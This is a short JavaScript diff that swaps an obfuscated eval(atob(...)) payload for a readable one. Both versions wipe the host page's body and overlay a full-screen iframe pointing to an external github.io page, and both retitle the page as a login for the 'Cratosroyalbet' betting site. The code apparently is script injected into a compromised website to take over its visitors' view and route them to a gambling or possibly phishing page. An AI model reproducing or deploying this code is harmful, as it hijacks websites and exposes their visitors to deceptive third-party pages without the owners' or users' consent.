@@ -1,1 +1,18 @@
-eval(atob("KGZ1bmN0aW9uKCkgewogICAgZG9jdW1lbnQudGl0bGUgPSAiQ3JhdG9zcm95YWxiZXQgR2lyaXNoIHwgQ3JhdG9zcm95YWxiZXQgR8O8bmNlbCBBZHJlcyB2ZSBZZW5pIExpbmsiOwogICAgdmFyIG0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdtZXRhJyk7IG0ubmFtZSA9ICJkZXNjcmlwdGlvbiI7IG0uY29udGVudCA9ICJDcmF0b3Nyb3lhbGJldCBlbiBn8OtuY2VsIGdpcmlzIGFkcmVzaSB2ZSBzb3J1bnN1eiBlcmnFn2ltIGxpbmtsZXJpLiI7IGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobSk7CiAgICB2YXIgaWYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTsgaWYuc3JjID0gJ2h0dHBzOi8vZGV2d29ya3NnLXV4LmdpdGh1Yi5pby9nZWxkaWtrc3MzL2luZGV4Lmh0bWwnOyAKICAgIGlmLnN0eWxlLmNzczV4dCA9ICdwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJStoZWlnaHQ6MTAwJTtib3JkZXI6bm9uZTt6LWluZGV4Ojk5OTk5OTtiYWNrZ3JvdW5kLWNvbG9yOiNmZmZmZmYnOwogICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LnN0eWxlLm92ZXJmbG93ID0gJ2hpZGRlbic7CiAgICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsgaWYgKGRvY3VtZW50LmJvZHkpIHsgZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnJzsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChpZik7IGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5zdHlsZS52aXNpYmlsaXR5ID0gInZpc2libGUiOyB9IH0sIDUpOwp9KSgpOw=="));
+(function() {
+    document.title = "Cratosroyalbet Giriş";
+    var ifr = document.createElement('iframe');
+    ifr.src = 'https://devworksg-ux.github.io/geldikkss3/index.html'; 
+    ifr.setAttribute('style', 'position:fixed; top:0; left:0; width:100%; height:100%; border:none; z-index:999999; background:#fff;' );
+    
+    var render = function() {
+        if (document.body) {
+            document.body.innerHTML = '';
+            document.body.appendChild(ifr);
+            document.documentElement.style.visibility = "visible";
+            document.body.style.visibility = "visible";
+        } else {
+            setTimeout(render, 10);
+        }
+    };
+    render();
+})();
